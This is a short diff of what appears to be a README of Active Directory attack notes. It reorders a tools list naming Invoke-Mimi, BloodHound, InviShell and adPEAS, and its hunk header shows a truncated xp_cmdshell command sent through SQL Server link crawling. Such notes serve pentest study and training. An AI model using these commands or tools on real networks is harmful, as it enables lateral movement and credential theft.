@@ -275,10 +275,11 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''
 
 ## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Tools)
 
-- adPEAS.ps1
+- Microsoft.ActiveDirectory.Management.dll
 - BloodHound-4.O.3_old.zip
 - Find-PSRemotingLocalAdminAccess.ps1
 - hfs.exe
+- adPEAS.ps1
 - InviShell
 - Nmap-7.92
 - Invoke-Mimi.ps1
